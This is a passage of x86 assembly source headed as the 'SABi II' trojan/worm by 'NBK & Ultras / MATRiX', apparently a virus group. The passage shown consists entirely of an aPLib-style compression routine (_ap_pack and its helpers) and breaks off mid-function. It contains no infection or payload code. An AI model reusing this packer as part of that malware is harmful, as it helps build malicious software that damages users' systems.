   ; Trojan/I-Worm/Palm/Wm/W32.SABi¡ II
   ; 
   ; by: NBK & Ultras / MATRiX

   aplib@029:

   push ecx
   push esi
   push edi
   push ebp
   sub esp, 00000004
   mov ecx, eax
   mov dword ptr [esp], edx
   mov ebp, ebx
   xor edi, edi
   cmp edx, 0000000Fh
   ja aplib@094   ;   0.040116E
   
   aplib@095:
   
   xor eax, eax
   mov al, byte ptr [ecx]
   test eax, eax
   je aplib@096   ;   0.0401177
   mov edx, dword ptr [esp]
   mov eax, edx
   neg eax
   mov esi, ecx
   add eax, ecx
   
   aplib@111:
   
   mov bl, byte ptr [ecx]
   cmp bl, byte ptr [eax]
   je aplib@112   ;   0.0401159
   inc eax
   dec edx
   cmp eax, esi
   jne aplib@111   ;   0.040114D
   
   aplib@112:
   
   add edi, 00000007
   test edx, edx
   je aplib@113   ;   0.040117C
   
   aplib@097:
   
   inc ecx
   dec ebp
   jne aplib@095
   mov eax, edi
   add esp, 00000004
   pop ebp
   pop edi
   pop esi
   pop ecx
   ret
   
   aplib@094:
   
   mov dword ptr [esp], 0000000Fh
   jmp aplib@095   ;   0.040113A
   
   aplib@096:
   
   add edi, 00000007
   jmp aplib@097   ;   0.0401160
   
   aplib@113:
   
   add edi, 00000002
   jmp aplib@097
   
   aplib@046:
   
   push ebx
   push ecx
   push esi
   push edi
   push ebp
   sub esp, 00000008
   mov ecx, dword ptr [aplib@015]
   mov ebx, dword ptr [aplib@004]
   mov esi, dword ptr [aplib@086]
   mov ebp, eax
   mov edi, edx
   xor eax, eax
   mov al, byte ptr [ebp+00]
   test eax, eax
   jne aplib@098   ;   0.040127E
   dec ecx
   cmp ecx, 0FFFFFFFFh
   je aplib@114   ;   0.0401239
   
   aplib@115:
   
   mov dl, byte ptr [esi]
   add dl, dl
   inc dl
   dec ecx
   mov byte ptr [esi], dl
   cmp ecx, 0FFFFFFFFh
   je aplib@116   ;   0.0401246
   
   aplib@117:
   
   mov dl, byte ptr [esi]
   add dl, dl
   inc dl
   dec ecx
   mov byte ptr [esi], dl
   cmp ecx, 0FFFFFFFFh
   je aplib@118   ;   0.0401253
   
   aplib@119:
   
   mov dl, byte ptr [esi]
   add dl, dl
   inc dl
   dec ecx
   mov byte ptr [esi], dl
   cmp ecx, 0FFFFFFFFh
   je aplib@120   ;   0.0401260
   
   aplib@121:
   
   mov dl, byte ptr [esi]
   add dl, dl
   dec ecx
   mov byte ptr [esi], dl
   cmp ecx, 0FFFFFFFFh
   je aplib@122   ;   0.040126A
   
   aplib@123:
   
   mov dl, byte ptr [esi]
   add dl, dl
   dec ecx
   mov byte ptr [esi], dl
   cmp ecx, 0FFFFFFFFh
   je aplib@124   ;   0.0401274
   
   aplib@125:
   
   mov dl, byte ptr [esi]
   add dl, dl
   dec ecx
   mov byte ptr [esi], dl
   cmp ecx, 0FFFFFFFFh
   jne aplib@126   ;   0.0401218
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   
   aplib@126:
   
   mov dl, byte ptr [esi]
   add dl, dl
   
   aplib@127:
   
   mov byte ptr [esi], dl
   
   aplib@128:
   
   mov dword ptr [aplib@086], esi
   mov dword ptr [aplib@004], ebx
   mov dword ptr [aplib@015], ecx
   add esp, 00000008
   
   aplib@129:
   
   pop ebp
   pop edi
   pop esi
   pop ecx
   pop ebx
   ret
   
   aplib@114:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@115   ;   0.04011B6
   
   aplib@116:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@117   ;   0.04011C8
   
   aplib@118:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@119   ;   0.04011DA
   
   aplib@120:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@121   ;   0.04011EC
   
   aplib@122:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@123   ;   0.04011F8
   
   aplib@124:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@125   ;   0.0401204
   
   aplib@098:
   
   cmp edx, 0000000Fh
   ja aplib@099   ;   0.0401367
   
   aplib@100:
   
   mov eax, edi
   neg eax
   mov dword ptr [esp+04], ebp
   add eax, ebp
   
   aplib@101:
   
   mov dl, byte ptr [ebp+00]
   cmp dl, byte ptr [eax]
   je aplib@102   ;   0.04012A2
   mov edx, dword ptr [esp+04]
   inc eax
   dec edi
   cmp eax, edx
   jne aplib@101   ;   0.0401291
   
   aplib@102:
   
   lea eax, dword ptr [ebx+01]
   mov dword ptr [esp], eax
   lea eax, dword ptr [ecx-01]
   test edi, edi
   je aplib@103   ;   0.04013E9
   mov ecx, eax
   cmp eax, 0FFFFFFFFh
   je aplib@130
   
   aplib@140:
   
   mov dl, byte ptr [esi]
   add dl, dl
   inc dl
   dec ecx
   mov byte ptr [esi], dl
   cmp ecx, 0FFFFFFFFh
   je aplib@131
   
   aplib@141:
   
   mov dl, byte ptr [esi]
   add dl, dl
   inc dl
   dec ecx
   mov byte ptr [esi], dl
   cmp ecx, 0FFFFFFFFh
   je aplib@132
   
   aplib@142:
   
   mov dl, byte ptr [esi]
   mov eax, edi
   add dl, dl
   dec ecx
   inc dl
   and eax, 00000008
   mov byte ptr [esi], dl
   cmp ecx, 0FFFFFFFFh
   je aplib@133
   
   aplib@143:
   
   test eax, eax
   je aplib@134
   mov dl, byte ptr [esi]
   add dl, dl
   inc dl
   
   aplib@144:
   
   mov byte ptr [esi], dl
   mov eax, edi
   dec ecx
   and eax, 00000004
   cmp ecx, 0FFFFFFFFh
   je aplib@135
   
   aplib@145:
   
   test eax, eax
   je aplib@136
   mov dl, byte ptr [esi]
   add dl, dl
   inc dl
   
   aplib@146:
   
   mov byte ptr [esi], dl
   mov eax, edi
   dec ecx
   and eax, 00000002
   cmp ecx, 0FFFFFFFFh
   je aplib@137
   
   aplib@147:
   
   test eax, eax
   je aplib@138
   mov dl, byte ptr [esi]
   add dl, dl
   inc dl
   
   aplib@148:
   
   mov byte ptr [esi], dl
   dec ecx
   and edi, 00000001
   cmp ecx, 0FFFFFFFFh
   je aplib@139
   
   aplib@149:
   
   test edi, edi
   je aplib@126   ;   0.0401218
   mov dl, byte ptr [esi]
   add dl, dl
   inc dl
   jmp aplib@127
   
   aplib@099:
   
   mov edi, 0000000Fh
   jmp aplib@100   ;   0.0401287
   
   aplib@130:
   
   mov ecx, 00000007
   mov esi, ebx
   mov ebx, dword ptr [esp]
   jmp aplib@140
   
   aplib@131:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@141
   
   aplib@132:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@142
   
   aplib@133:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@143
   
   aplib@134:
   
   mov dl, byte ptr [esi]
   add dl, dl
   jmp aplib@144
   
   aplib@135:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@145
   
   aplib@136:
   
   mov dl, byte ptr [esi]
   add dl, dl
   jmp aplib@146
   
   aplib@137:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@147
   
   aplib@138:
   
   mov dl, byte ptr [esi]
   add dl, dl
   jmp aplib@148
   
   aplib@139:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@149
   
   aplib@103:
   
   mov ecx, eax
   cmp eax, 0FFFFFFFFh
   jne aplib@104   ;   0.04013FA
   mov ecx, 00000007
   mov esi, ebx
   mov ebx, dword ptr [esp]
   
   aplib@104:
   
   mov dl, byte ptr [esi]
   add dl, dl
   mov byte ptr [esi], dl
   mov al, byte ptr [ebp+00]
   mov byte ptr [ebx], al
   inc ebx
   jmp aplib@128
   
   aplib@025:
   
   push ecx
   mov ecx, eax
   cmp eax, 00000080h
   jnb aplib@106   ;   0.0401434
   cmp edx, 00000004
   jnb aplib@106
   cmp eax, dword ptr [aplib@016]
   je aplib@106
   test eax, eax
   jne aplib@105   ;   0.040142D
   mov eax, 00000005
   pop ecx
   ret
   
   aplib@105:
   
   mov eax, 0000000Bh
   pop ecx
   ret
   
   aplib@106:
   
   push esi
   push ebx
   mov esi, dword ptr [aplib@016]
   mov ebx, 00000004
   cmp ecx, esi
   je aplib@107
   mov eax, ecx
   shr eax, 08
   add eax, 00000003
   cmp eax, 00000002
   jge aplib@150
   mov eax, 00000064h
   
   aplib@151:
   
   add eax, 00000006
   add ebx, eax
   cmp ecx, 00000080h
   jnb aplib@152   ;   0.0401565
   sub edx, 00000002
   
   aplib@107:
   
   cmp edx, 00000002
   jnl aplib@109   ;   0.0401580
   mov eax, 00000064h
   
   aplib@108:
   
   add eax, ebx
   pop ebx
   pop esi
   pop ecx
   ret
   
   aplib@150:
   
   cmp eax, ebx
   jge aplib@168
   mov eax, 00000002
   jmp aplib@151
   
   aplib@168:
   
   cmp eax, 00000008
   jge aplib@167
   mov eax, ebx
   jmp aplib@151
   
   aplib@167:
   
   cmp eax, 00000010h
   jge aplib@166
   mov eax, 00000006h
   jmp aplib@151
   
   aplib@166:
   
   cmp eax, 00000020h
   jge aplib@165
   mov eax, 00000008
   jmp aplib@151
   
   aplib@165:
   
   cmp eax, 00000040h
   jge aplib@164
   mov eax, 0000000Ah
   jmp aplib@151
   
   aplib@164:
   
   cmp eax, 00000080h
   jge aplib@163
   mov eax, 0000000Ch
   jmp aplib@151
   
   aplib@163:
   
   cmp eax, 00000100h
   jge aplib@162
   mov eax, 0000000Eh
   jmp aplib@151
   
   aplib@162:
   
   cmp eax, 00000200h
   jge aplib@161
   mov eax, 00000010h
   jmp aplib@151
   
   aplib@161:
   
   cmp eax, 00000400h
   jge aplib@160
   mov eax, 00000012h
   jmp aplib@151
   
   aplib@160:
   
   cmp eax, 00000800h
   jge aplib@159
   mov eax, 00000014h
   jmp aplib@151
   
   aplib@159:
   
   cmp eax, 00001000h
   jge aplib@158
   mov eax, 00000016h
   jmp aplib@151
   
   aplib@158:
   
   cmp eax, 00002000h
   jge aplib@157
   mov eax, 00000018h
   jmp aplib@151
   
   aplib@157:
   
   cmp eax, 00004000h
   jge aplib@156
   mov eax, 0000001Ah
   jmp aplib@151
   
   aplib@156:
   
   cmp eax, 00008000h
   jge aplib@155
   mov eax, 0000001Ch
   jmp aplib@151
   
   aplib@155:
   
   cmp eax, 00010000h
   jge aplib@154
   mov eax, 0000001Eh
   jmp aplib@151
   
   aplib@154:
   
   mov eax, 00000020h
   jmp aplib@151
   
   aplib@152:
   
   cmp ecx, 00000500h
   jb aplib@153   ;   0.040156E
   dec edx
   
   aplib@153:
   
   cmp ecx, 00007D00h
   jb aplib@107
   dec edx
   jmp aplib@107
   
   aplib@109:
   
   cmp edx, 00000004
   jge aplib@110   ;   0.040158F
   mov eax, 00000002
   jmp aplib@108
   
   aplib@110:
   
   cmp edx, 00000008
   jge aplib@169
   mov eax, 00000004
   jmp aplib@108
   
   aplib@169:
   
   cmp edx, 00000010h
   jge aplib@170
   mov eax, 00000006
   jmp aplib@108
   
   aplib@170:
   
   cmp edx, 00000020h
   jge aplib@171
   mov eax, 00000008
   jmp aplib@108
   
   aplib@171:
   
   cmp edx, 00000040h
   jge aplib@172
   mov eax, 0000000Ah
   jmp aplib@108
   
   aplib@172:
   
   cmp edx, 00000080h
   jge aplib@173
   mov eax, 0000000Ch
   jmp aplib@108
   
   aplib@173:
   
   cmp edx, 00000100h
   jge aplib@174
   mov eax, 0000000Eh
   jmp aplib@108
   
   aplib@174:
   
   cmp edx, 00000200h
   jge aplib@175
   mov eax, 00000010h
   jmp aplib@108
   
   aplib@175:
   
   cmp edx, 00000400h
   jge aplib@176
   mov eax, 00000012h
   jmp aplib@108
   
   aplib@176:
   
   cmp edx, 00000800h
   jge aplib@177
   mov eax, 00000014h
   jmp aplib@108
   
   aplib@177:
   
   cmp edx, 00001000h
   jge aplib@178
   mov eax, 00000016h
   jmp aplib@108
   
   aplib@178:
   
   cmp edx, 00002000h
   jge aplib@179
   mov eax, 00000018h
   jmp aplib@108
   
   aplib@179:
   
   cmp edx, 00004000h
   jge aplib@180
   mov eax, 0000001Ah
   jmp aplib@108
   
   aplib@180:
   
   cmp edx, 00008000h
   jge aplib@181
   mov eax, 0000001Ch
   jmp aplib@108
   
   aplib@181:
   
   cmp edx, 00010000h
   jge aplib@182
   mov eax, 0000001Eh
   jmp aplib@108
   
   aplib@182:
   
   mov eax, 00000020h
   jmp aplib@108
   
   aplib@058:
   
   push ebx
   push ecx
   push esi
   push edi
   push ebp
   sub esp, 00000010h
   mov ecx, dword ptr [aplib@015]
   mov ebx, dword ptr [aplib@004]
   mov esi, dword ptr [aplib@086]
   mov dword ptr [esp+0Ch], eax
   mov dword ptr [esp+08], edx
   cmp eax, 00000080h
   jnb aplib@183
   cmp edx, 00000004
   jnb aplib@183
   cmp eax, dword ptr [aplib@016]
   je aplib@183
   dec ecx
   cmp ecx, 0FFFFFFFFh
   je aplib@184
   
   aplib@185:
   
   mov dl, byte ptr [esi]
   add dl, dl
   inc dl
   dec ecx
   mov byte ptr [esi], dl
   cmp ecx, 0FFFFFFFFh
   je aplib@186
   
   aplib@187:
   
   mov dl, byte ptr [esi]
   add dl, dl
   inc dl
   dec ecx
   mov byte ptr [esi], dl
   cmp ecx, 0FFFFFFFFh
   jne aplib@188
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   
   aplib@188:
   
   mov edi, dword ptr [esp+08]
   mov eax, dword ptr [esp+0Ch]
   mov dl, byte ptr [esi]
   sub edi, 00000002
   add dl, dl
   add eax, eax
   and edi, 00000001
   mov byte ptr [esi], dl
   add eax, edi
   mov byte ptr [ebx], al
   mov eax, dword ptr [esp+0Ch]
   inc ebx
   mov dword ptr [aplib@016], eax
   
   aplib@189:
   
   mov dword ptr [aplib@086], esi
   mov dword ptr [aplib@004], ebx
   mov dword ptr [aplib@015], ecx
   add esp, 00000010h
   jmp aplib@129
   
   aplib@184:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@185
   
   aplib@186:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@187
   
   aplib@183:
   
   dec ecx
   cmp ecx, 0FFFFFFFFh
   je aplib@190
   
   aplib@201:
   
   mov dl, byte ptr [esi]
   add dl, dl
   inc dl
   dec ecx
   mov byte ptr [esi], dl
   cmp ecx, 0FFFFFFFFh
   je aplib@191
   
   aplib@202:
   
   mov dl, byte ptr [esi]
   mov eax, dword ptr [esp+0Ch]
   add dl, dl
   mov ebp, dword ptr [aplib@016]
   mov byte ptr [esi], dl
   cmp eax, ebp
   je aplib@192
   mov ebp, eax
   shr ebp, 08
   xor eax, eax
   add ebp, 00000003
   
   aplib@193:
   
   add edi, edi
   inc eax
   mov dword ptr [esp+04], edi
   mov edi, ebp
   mov edx, dword ptr [esp+04]
   and edi, 00000001
   shr ebp, 1
   add edi, edx
   cmp ebp, 00000001
   ja aplib@193
   
   aplib@200:
   
   mov ebp, edi
   dec eax
   and ebp, 00000001
   test eax, eax
   je aplib@194
   dec ecx
   cmp ecx, 0FFFFFFFFh
   je aplib@195
   
   aplib@196:
   
   test ebp, ebp
   je aplib@197
   mov dl, byte ptr [esi]
   add dl, dl
   inc dl
   
   aplib@217:
   
   mov byte ptr [esi], dl
   dec ecx
   cmp ecx, 0FFFFFFFFh
   je aplib@198
   
   aplib@199:
   
   mov dl, byte ptr [esi]
   add dl, dl
   inc dl
   shr edi, 1
   mov byte ptr [esi], dl
   jmp aplib@200
   
   aplib@190:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@201
   
   aplib@191:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@202
   
   aplib@192:
   
   dec ecx
   cmp ecx, 0FFFFFFFFh
   je aplib@203
   
   aplib@204:
   
   mov dl, byte ptr [esi]
   add dl, dl
   dec ecx
   mov byte ptr [esi], dl
   cmp ecx, 0FFFFFFFFh
   je aplib@205
   
   aplib@206:
   
   mov dl, byte ptr [esi]
   add dl, dl
   mov byte ptr [esi], dl
   
   aplib@207:
   
   mov ebp, dword ptr [esp+08]
   xor eax, eax
   
   aplib@208:
   
   mov edx, dword ptr [esp]
   mov edi, ebp
   inc eax
   add edx, edx
   and edi, 00000001
   add edx, edi
   shr ebp, 1
   mov dword ptr [esp], edx
   cmp ebp, 00000001
   ja aplib@208
   
   aplib@209:
   
   mov edi, dword ptr [esp]
   dec eax
   and edi, 00000001
   test eax, eax
   je aplib@210
   dec ecx
   cmp ecx, 0FFFFFFFFh
   je aplib@211
   
   aplib@212:
   
   test edi, edi
   je aplib@213
   mov dl, byte ptr [esi]
   add dl, dl
   inc dl
   
   aplib@214:
   
   mov byte ptr [esi], dl
   dec ecx
   cmp ecx, 0FFFFFFFFh
   je aplib@215
   
   aplib@216:
   
   mov dl, byte ptr [esi]
   add dl, dl
   inc dl
   mov byte ptr [esi], dl
   shr dword ptr [esp], 1
   jmp aplib@209
   
   aplib@203:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@204
   
   aplib@205:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@206
   
   aplib@195:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@196
   
   aplib@197:
   
   mov dl, byte ptr [esi]
   add dl, dl
   jmp aplib@217
   
   aplib@198:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@199
   
   aplib@194:
   
   dec ecx
   cmp ecx, 0FFFFFFFFh
   je aplib@218
   
   aplib@219:
   
   test ebp, ebp
   je aplib@220
   mov dl, byte ptr [esi]
   add dl, dl
   inc dl
   
   aplib@221:
   
   mov byte ptr [esi], dl
   dec ecx
   cmp ecx, 0FFFFFFFFh
   je aplib@222
   
   aplib@223:
   
   mov dl, byte ptr [esi]
   add dl, dl
   mov al, byte ptr [esp+0Ch]
   mov byte ptr [esi], dl
   mov byte ptr [ebx], al
   mov eax, dword ptr [esp+0Ch]
   inc ebx
   mov dword ptr [aplib@016], eax
   cmp eax, 00000080h
   jnb aplib@224
   sub dword ptr [esp+08], 00000002
   jmp aplib@207
   
   aplib@218:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@219
   
   aplib@220:
   
   mov dl, byte ptr [esi]
   add dl, dl
   jmp aplib@221
   
   aplib@222:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@223
   
   aplib@224:
   
   cmp eax, 00000500h
   jb aplib@225
   dec dword ptr [esp+08]
   
   aplib@225:
   
   cmp dword ptr [esp+0Ch], 00007D00h
   jb aplib@207
   dec dword ptr [esp+08]
   jmp aplib@207
   
   aplib@211:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@212
   
   aplib@213:
   
   mov dl, byte ptr [esi]
   add dl, dl
   jmp aplib@214
   
   aplib@215:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@216
   
   aplib@210:
   
   dec ecx
   cmp ecx, 0FFFFFFFFh
   je aplib@226
   
   aplib@227:
   
   test edi, edi
   je aplib@228
   mov dl, byte ptr [esi]
   add dl, dl
   inc dl
   
   aplib@229:
   
   mov byte ptr [esi], dl
   dec ecx
   cmp ecx, 0FFFFFFFFh
   jne aplib@230
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   
   aplib@230:
   
   mov dl, byte ptr [esi]
   add dl, dl
   mov byte ptr [esi], dl
   jmp aplib@189
   
   aplib@226:
   
   mov ecx, 00000007
   mov esi, ebx
   inc ebx
   jmp aplib@227
   
   aplib@228:
   
   mov dl, byte ptr [esi]
   add dl, dl
   jmp aplib@229
   
   aplib@023:
   
   push esi
   push edi
   push ebp
   sub esp, 0000002Ch
   mov edi, dword ptr [aplib@014]
   mov dword ptr [esp+04], eax
   mov dword ptr [esp+20h], edx
   mov dword ptr [esp+14h], ebx
   mov dword ptr [esp+0Ch], ecx
   xor edx, edx
   mov ecx, dword ptr [aplib@013]
   mov dword ptr [esp+24h], edx
   mov dword ptr [esp+10h], edx
   mov edx, dword ptr [aplib@013]
   add ecx, 00016800h
   dec edx
   
   aplib@231:
   
   mov ebx, dword ptr [esp+20h]
   mov eax, dword ptr [aplib@017]
   cmp eax, ebx
   jnb aplib@232
   xor ebx, ebx
   mov bl, byte ptr [eax]
   mov al, byte ptr [eax+01]
   and eax, 000000FFh
   mov ebx, dword ptr [4*ebx+aplib@010]
   shl eax, 02
   add ebx, eax
   mov eax, dword ptr [aplib@013]
   cmp ecx, eax
   jbe aplib@233
   cmp eax, edi
   jbe aplib@234
   
   aplib@235:
   
   sub eax, edi
   
   aplib@236:
   
   mov esi, dword ptr [aplib@009]
   mov ebx, dword ptr [ebx]
   mov dword ptr [esi+4*eax], ebx
   mov eax, dword ptr [aplib@017]
   xor ebx, ebx
   movzx esi, byte ptr [eax+01]
   mov bl, byte ptr [eax]
   shl esi, 02
   mov ebx, dword ptr [4*ebx+aplib@010]
   inc ecx
   add ebx, esi
   mov esi, dword ptr [aplib@013]
   inc eax
   mov dword ptr [ebx], esi
   lea ebx, dword ptr [esi+01]
   mov dword ptr [aplib@017], eax
   mov eax, ebx
   inc edx
   sub eax, edi
   mov dword ptr [aplib@013], ebx
   cmp eax, 00016800h
   jbe aplib@231
   mov edi, edx
   jmp aplib@231
   
   aplib@234:
   
   mov eax, ecx
   jmp aplib@235
   
   aplib@233:
   
   xor eax, eax
   jmp aplib@236
   
   aplib@232:
   
   cmp dword ptr [esp+0Ch], 00016700h
   jbe aplib@237
   mov [esp+0Ch], 00016700h
   
   aplib@237:
   
   mov edx, dword ptr [esp+20h]
   xor eax, eax
   mov ecx, dword ptr [esp+20h]
   mov al, byte ptr [edx]
   xor edx, edx
   mov dl, byte ptr [ecx+01]
   mov ecx, dword ptr [4*eax+aplib@010]
   mov ecx, dword ptr [ecx+4*edx]
   test ecx, ecx
   je aplib@238
   cmp dword ptr [esp+0Ch], 00000001
   jbe aplib@238
   mov edx, 00000800h
   mov esi, dword ptr [esp+20h]
   mov ebp, dword ptr [aplib@005]
   mov ebx, dword ptr [aplib@013]
   mov dword ptr [esp+28h], edx
   
   aplib@246:
   
   add ebp, ecx
   cmp ebp, esi
   jb aplib@241
   test ecx, ecx
   je aplib@241
   lea eax, dword ptr [ecx+00016800h]
   cmp eax, ebx
   jbe aplib@242
   cmp ecx, edi
   jbe aplib@243
   
   aplib@245:
   
   sub ecx, edi
   
   aplib@244:
   
   mov eax, ecx
   mov ecx, dword ptr [aplib@009]
   mov ebp, dword ptr [aplib@005]
   mov ecx, dword ptr [ecx+4*eax]
   jmp aplib@246
   
   aplib@243:
   
   mov ecx, eax
   jmp aplib@245
   
   aplib@242:
   
   xor ecx, ecx
   jmp aplib@244
   
   aplib@241:
   
   cmp dword ptr [esp+14h], 00016700h
   ja aplib@260
   
   aplib@240:
   
   mov eax, dword ptr [esp+0Ch]
   mov dword ptr [esp+08], eax
   
   aplib@239:
   
   test ecx, ecx
   je aplib@238
   mov eax, dword ptr [esp+20h]
   mov esi, dword ptr [esp+14h]
   sub eax, ebp
   cmp eax, esi
   ja aplib@238
   mov esi, dword ptr [esp+24h]
   mov edx, dword ptr [esp+20h]
   add edx, esi
   mov dword ptr [esp], edx
   mov dl, byte ptr [esi+ebp]
   mov esi, dword ptr [esp]
   mov ebx, 00000002
   mov dh, byte ptr [esi]
   mov dword ptr [esp+1Ch], eax
   cmp dl, dh
   je aplib@247
   cmp eax, dword ptr [aplib@016]
   jne aplib@248
   
   aplib@247:
   
   mov edx, dword ptr [esp+08]
   mov esi, dword ptr [esp+20h]
   add edx, ebp
   add esi, ebx
   mov dword ptr [esp+18h], edx
   lea eax, dword ptr [ebx+ebp]
   
   aplib@261:
   
   mov dl, byte ptr [eax]
   cmp dl, byte ptr [esi]
   jne aplib@259
   cmp eax, dword ptr [esp+18h]
   jnb aplib@259
   inc esi
   inc eax
   inc ebx
   jmp aplib@261
   
   aplib@260:
   
   mov [esp+14h], 00016700h
   jmp aplib@240
   
   aplib@259:
   
   mov esi, dword ptr [esp+0Ch]
   cmp ebx, esi
   jne aplib@258
   mov eax, dword ptr [esp+1Ch]
   mov dword ptr [esp+24h], esi
   xor ecx, ecx
   mov dword ptr [esp+10h], eax
   jmp aplib@239
   
   aplib@258:
   
   mov ebp, dword ptr [esp+24h]
   mov dword ptr [aplib@014], edi
   cmp ebx, ebp
   jbe aplib@257
   mov eax, dword ptr [esp+1Ch]
   mov edx, ebx
   call aplib@025
   mov esi, eax
   mov edx, ebp
   mov eax, dword ptr [esp+10h]
   call aplib@025
   mov edx, esi
   sub edx, eax
   add edx, edx
   mov esi, 0000000Dh
   mov eax, edx
   sar edx, 1Fh
   idiv esi
   add eax, ebp
   cmp ebx, eax
   jbe aplib@257
   
   aplib@255:
   
   mov eax, dword ptr [esp+1Ch]
   mov dword ptr [esp+24h], ebx
   mov dword ptr [esp+10h], eax
   
   aplib@256:
   
   mov edx, dword ptr [aplib@013]
   lea eax, dword ptr [ecx+00016800h]
   mov edi, dword ptr [aplib@014]
   cmp eax, edx
   jbe aplib@254
   cmp ecx, edi
   jbe aplib@253
   mov eax, ecx
   
   aplib@253:
   
   sub eax, edi
   
   aplib@252:
   
   mov ecx, dword ptr [aplib@009]
   mov ebp, dword ptr [aplib@005]
   mov ecx, dword ptr [ecx+4*eax]
   mov ebx, dword ptr [esp+28h]
   add ebp, ecx
   dec ebx
   mov dword ptr [esp+28h], ebx
   jne aplib@239
   xor ecx, ecx
   jmp aplib@239
   
   aplib@257:
   
   mov eax, dword ptr [esp+1Ch]
   cmp eax, dword ptr [aplib@016]
   jne aplib@256
   mov edx, dword ptr [esp+24h]
   mov eax, dword ptr [esp+10h]
   call aplib@025
   mov esi, eax
   mov edx, ebx
   mov eax, dword ptr [esp+1Ch]
   call aplib@025
   mov edx, esi
   sub edx, eax
   mov esi, 00000006
   mov eax, edx
   sar edx, 1Fh
   idiv esi
   mov ebp, dword ptr [esp+24h]
   add eax, ebx
   cmp eax, ebp
   jb aplib@256
   jmp aplib@255
   
   aplib@254:
   
   xor eax, eax
   jmp aplib@252
   
   aplib@248:
   
   mov ebx, dword ptr [aplib@013]
   lea eax, dword ptr [ecx+00016800h]
   cmp eax, ebx
   jbe aplib@249
   cmp ecx, edi
   jbe aplib@251
   mov eax, ecx
   
   aplib@251:
   
   sub eax, edi
   
   aplib@250:
   
   mov ecx, dword ptr [aplib@009]
   mov ebp, dword ptr [aplib@005]
   mov ecx, dword ptr [ecx+4*eax]
   mov esi, dword ptr [esp+28h]
   add ebp, ecx
   dec esi
   mov dword ptr [esp+28h], esi
   jne aplib@239
   
   aplib@238:
   
   mov edx, dword ptr [esp+04]
   mov eax, dword ptr [esp+24h]
   mov dword ptr [edx+04], eax
   mov eax, dword ptr [esp+10h]
   mov dword ptr [edx], eax
   mov dword ptr [aplib@014], edi
   add esp, 0000002Ch
   pop ebp
   pop edi
   pop esi
   ret
   
   aplib@249:
   
   xor eax, eax
   jmp aplib@250
   
   _ap_pack:
   
   push ebx
   push esi
   push edi
   push ebp
   sub esp, 00000034h
   mov ebx, dword ptr [esp+54h]
   mov edx, dword ptr [esp+48h]
   test edx, edx
   je aplib@001   ;   0.0402670
   
   mov ecx, dword ptr [esp+4Ch]
   test ecx, ecx
   je aplib@002   ;   0.0402672
   cmp dword ptr [esp+50h], 00000002
   jb aplib@001
   test ebx, ebx
   je aplib@001
   mov edi, 0FEEDABEEh
   mov dword ptr [aplib@003], edx   ;   0.0403514
   lea eax, dword ptr [edx-01]
   mov dword ptr [aplib@004], ecx   ;   0.0403510
   mov dword ptr [aplib@005], eax   ;   0.0403520
   mov eax, ecx
   mov dword ptr [esp+24h], edi
   xor eax, ecx
   
   aplib@007:
   
   mov ecx, dword ptr [esp+24h]
   mov edx, dword ptr [esp+24h]
   shr ecx, 1Fh
   add edx, edx
   or edx, ecx
   xor ecx, ecx
   mov cl, byte ptr [eax+aplib@006]   ;   0.0403000
   xor edx, ecx
   inc eax
   mov dword ptr [esp+24h], edx
   cmp eax, 00000100h
   jb aplib@007   ;   0.0401D0D
   test edx, edx
   jne aplib@008  ;   0.040202A
   mov dword ptr [aplib@009], ebx   ;   0.0403100
   mov edx, ebx
   xor edi, edi
   xor ebx, ebx
   
   aplib@012:
   
   lea eax, dword ptr [edx+0005A018h]
   mov esi, edi
   mov dword ptr [edi+aplib@010], eax   ;   0.0403104
   mov eax, ebx
   
   aplib@011:
   
   mov ecx, dword ptr [esi+aplib@010]
   mov dword ptr [ecx+eax], ebx
   add eax, 00000004
   cmp eax, 00000400h
   jne aplib@011   ;   0.0401D56
   add edi, 00000004
   add edx, eax
   cmp edi, eax
   jne aplib@012   ;   0.0401D46
   mov ecx, 00000001
   mov ebp, 0FFFFFFFFh
   mov edx, dword ptr [aplib@009]
   xor esi, esi
   xor edi, eax
   mov eax, 0FFFFFFFFh
   mov dword ptr [esp+20h], esi
   mov dword ptr [aplib@013], ecx   ;   0.0403504
   mov dword ptr [aplib@014], esi   ;   0.040350C
   mov dword ptr [esp+1Ch], ebp
   mov dword ptr [aplib@015], esi   ;   0.040351C
   mov dword ptr [edx], esi
   mov edx, dword ptr [aplib@004]
   mov dword ptr [aplib@016], eax   ;   0.0403524
   mov eax, dword ptr [aplib@003]
   mov ebp, ecx
   mov dword ptr [aplib@017], eax   ;   0.0403508
   mov bl, byte ptr [eax]
   add eax, ecx
   mov byte ptr [edx], bl
   add edx, ecx
   mov dword ptr [aplib@003], eax
   mov dword ptr [aplib@004], edx
   
   aplib@036:
   
   cmp ebp, dword ptr [esp+50h]
